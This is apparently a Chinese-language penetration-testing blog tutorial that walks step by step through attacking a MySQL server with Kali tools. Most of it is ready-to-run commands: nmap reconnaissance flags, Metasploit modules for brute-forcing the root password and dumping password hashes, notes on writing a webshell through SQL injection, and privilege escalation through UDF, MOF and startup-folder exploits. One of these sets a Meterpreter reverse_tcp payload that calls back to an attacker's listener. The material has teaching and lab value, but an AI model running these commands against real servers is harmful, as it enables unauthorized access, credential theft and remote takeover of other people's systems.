# 原创
：  【kali-漏洞利用】（3.4）Metasploit渗透攻击应用：MySQL渗透过程

# 【kali-漏洞利用】（3.4）Metasploit渗透攻击应用：MySQL渗透过程

**目录**

[一、渗透攻击MySQL](#%E4%B8%80%E3%80%81%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BBMySQL)

[1.1、第一步：信息收集](#1.1%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86)

[db_nmap扫描（内置、外置都可）](#db_nmap%E6%89%AB%E6%8F%8F%EF%BC%88%E5%86%85%E7%BD%AE%E3%80%81%E5%A4%96%E7%BD%AE%E9%83%BD%E5%8F%AF%EF%BC%89)

[Metasploit模块](#Metasploit%E6%A8%A1%E5%9D%97)

[sqlmap](#sqlmap)

[1.2、第二步：获取服务器权限（爆破）](#1.2%E3%80%81%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E8%8E%B7%E5%8F%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90%EF%BC%88%E7%88%86%E7%A0%B4%EF%BC%89)

[MySQL 口令爆破](#MySQL%20%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4)

[哈希值爆破](#%E5%93%88%E5%B8%8C%E5%80%BC%E7%88%86%E7%A0%B4)

[泄露的源码中寻找数据库密码](#%E6%B3%84%E9%9C%B2%E7%9A%84%E6%BA%90%E7%A0%81%E4%B8%AD%E5%AF%BB%E6%89%BE%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%86%E7%A0%81)

[向服务器写WebShell](#%E5%90%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%86%99WebShell)

[1.3、第三步：提权](#1.3%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E6%8F%90%E6%9D%83)

[UDF提权（UDF提权）](#UDF%E6%8F%90%E6%9D%83%EF%BC%88UDF%E6%8F%90%E6%9D%83%EF%BC%89)

[Mof提权](#Mof%E6%8F%90%E6%9D%83)

[MySQL启动项提权](#MySQL%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83)

[1.4、第四步：MySQL 0day 漏洞](#1.4%E3%80%81%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9AMySQL%200day%20%E6%BC%8F%E6%B4%9E)

---


## 一、渗透攻击MySQL

> 
<h3>1.1、第一步：信息收集</h3>
<h4>db_nmap扫描（内置、外置都可）</h4>
<pre><code>目标发现


-iL        #添加扫描ip列表文件
-iR        #随机选择目标
           #不用指定目标ip，nmap对全球的ip随机选择100个进行扫描
--exclude  #排除扫描</code></pre>

<pre><code>主机发现


-sn     #ping扫描，不扫描端口
-Pn     #完全扫描（穿透防火墙）
-PS/PA/PU/PY[portlist]   #协议扫描，TCP、SYN/ACK、UDP、SCTP ，基于上述协议扫描端口
-PO[protocol list]       #使用ip协议扫描
-n/-R
-n：   #不进行nds解析
-R：   #对其进行反向解析
--dns-servers    #更换DNS服务器为得到不同的扫描结果
--traceroute     #路由追踪，等同于traceroute命令</code></pre>

<pre><code>端口发现

-sS/sT/sA/sW/sM   #基于TCP的端口发现（SYN全连接 ACK窗口 Maimon扫描）
-sU         #基于UPD协议的扫描，但是UDP的扫描的准确率并不高
-sN/sF/sX   #基于TCP的空/finish/xmas的扫描
--scanflags &lt;flags&gt;  #对TCP的扫描，是对tcpflags位的组合，可以自定义组合
-sI         #僵尸扫描
-sY/sZ      #基于SCTP协议(少用)
-b          #基于FTP的中继扫描
</code></pre>

<pre><code>端口和扫描菜单

-p     #扫描特定类型端口/范围
--exclude-ports  #排除不需扫描的端口范围
-F     #快速扫描
-r     #按顺序扫描
namp默认每次扫描中随机选择（常用端口的top n），-r会使namp按照从大到小的顺序进行

</code></pre>

<pre><code>服务/版本探测

-sV
--version-intensity
--version-trace
对扫描过程进行跟踪，显示扫描的具体过程
</code></pre>
<hr/>
<h4>Metasploit模块</h4>
<pre><code> #获取MySQL相关信息
auxiliary/admin/mysql/mysql_enum
auxiliary/scanner/mysql/mysql_version

 #文件枚举和目录可写信息枚举
auxiliary/scanner/mysql/mysql_file_enum
auxiliary/scanner/mysql/mysql_writable_dirs</code></pre>
<hr/>
<h4>sqlmap</h4>
通过注入点利用，获取数据库相关信息


#### Metasploit模块

---


> 
<h3>1.2、第二步：获取服务器权限（爆破）</h3>
如果目标服务器开启3389端口，并且允许远程访问，可以采取爆破MySQL用户密码，获取MySQL的权限
<h4>MySQL 口令爆破</h4>
爆破成功的几率很低几乎为零，除非管理员用的是弱口令。通过社工可以提高一定成功率，通过收集各种信息，例如姓名、社交平台账号/昵称、手机号、生日、伴侣姓名/生日、职业等信息，通过信息生成针对性的字典，利用该字典进行爆破
<pre><code>1、metasploit相关模块爆破

use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.x.x
set pass_file /tmp/wordlists.txt    # 设置字典
set username root
run</code></pre>

<pre><code>2、nmap扫描并破解

nmap --script=mysql-brute.nse &lt;ip&gt; -p 3306

自定义账号、密码
nmap  --script=mysql-brute.nse userdb=/tmp/passdb.txt passdb=/tmp/pass.txt 192.168.1.13 -p 3306

检查mysql root空口令
nmap --script=mysql-empty-password.nse &lt;ip&gt;</code></pre>
<hr/>
<h4>哈希值爆破</h4>
<pre><code>auxiliary/scanner/mysql/mysql_hashdump

导出在当前登陆用户权限下可以查看账户的密码hash</code></pre>
<hr/>
<h4>泄露的源码中寻找数据库密码</h4>
<pre><code>网站的配置文件中大多含有数据库的连接配置，如数据库用户名、密码等配置信息

eg：config  connect等</code></pre>
<hr/>
<h4>向服务器写WebShell</h4>
<pre><code>前提：存在sql注入漏洞、当前用户具有写入权限、目标网站Web物理路径、secure_file_priv 选项支持数据导出

高版本的MYSQL添加了secure_file_priv，对导出文件做了限制：

1、输出目录路径应该secure_file_priv值一致，才能导出。

2、若其值为空，则无限制。

3、值为 NULL 时，表示不允许导入或导出</code></pre>


#### 哈希值爆破

---


#### 向服务器写WebShell

> 
<h3>1.3、第三步：提权</h3>
<h4>UDF提权（UDF提权）</h4>
<pre><code>use exploit/multi/mysql/mysql_udf_payload
set rhosts 192.168.x.x
set username root
set password root
run

MSF会将一个随机命名的UDF文件写入lib/plugin目录下（该目录不存在，则无法成功),该UDF文件中包含sys_exec()和sys_eval()这两个函数，但是默认只创建sys_exec()函数，该函数执行不会有回显。
可以手动引入 sys_eval() 函数，来执行有回显的命令
create function sys_eval returns string soname 'guuHCUiK.dll';
</code></pre>
<hr/>
<h4>Mof提权</h4>
<pre>`exploit/windows/mysql/mysql_mof`</pre>
<hr/>
<h4>MySQL启动项提权</h4>
<pre><code>use exploit/windows/mysql/mysql_start_up
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.x.x
set lport 4444
set rhosts x.x.x.x
set username root
set password root
set startup_folder xxx     # 根据目标系统进行设置自启目录
run</code></pre>


#### Mof提权

---


> 
<h3>1.4、第四步：MySQL 0day 漏洞</h3>
网上查询了去利用

